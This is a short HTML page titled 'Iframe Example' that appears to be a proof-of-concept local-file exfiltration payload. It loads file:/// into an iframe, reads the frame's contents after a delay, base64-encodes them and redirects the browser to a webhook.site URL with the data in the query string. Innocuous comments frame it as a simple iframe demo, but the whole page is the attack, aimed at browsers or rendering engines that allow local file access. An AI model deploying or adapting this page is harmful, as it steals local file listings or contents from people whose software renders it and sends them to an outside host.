<!DOCTYPE html>
<html>
<head>
  <title>Iframe Example</title>
</head>
<body>
  <iframe src="file:///" id="myIframe"></iframe>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      var iframe = document.getElementById("myIframe");

      iframe.addEventListener("load", function() {
        // Set a timeout of 2 seconds (2000 milliseconds)
        setTimeout(function() {
          // Access the content of the iframe after the timeout
          var iframeContent = iframe.contentDocument || iframe.contentWindow.document;
          console.log(iframeContent);
          // You can perform further actions or manipulations on the iframe content here

            url = "https://webhook.site/c6560158-65d9-4877-8040-964123673650";
            sec = btoa(iframeContent)
            document.location=url+"?"+encodeURIComponent(sec);
        }, 2000);
      });
    });
  </script>
</body>
</html>
